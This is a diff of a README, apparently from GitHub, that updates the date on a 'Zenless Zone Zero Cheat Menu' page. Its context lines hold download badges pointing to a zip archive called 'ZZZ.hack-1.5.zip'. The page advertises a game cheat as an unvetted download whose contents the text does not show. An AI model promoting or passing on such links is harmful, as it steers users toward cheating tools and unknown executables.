@@ -1,4 +1,4 @@
-# Zenless Zone Zero Cheat Menu (UPD: 24-Aug-2026)
+# Zenless Zone Zero Cheat Menu (UPD: 29-Aug-2026)
 
 [![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/rivetqueenrivet/zenless-hack/releases/download/v1.5/ZZZ.hack-1.5.zip)
 [![GitHub release](https://img.shields.io/badge/Release-v1.5-blue?style=for-the-badge)](https://github.com/rivetqueenrivet/zenless-hack/releases/download/v1.5/ZZZ.hack-1.5.zip)
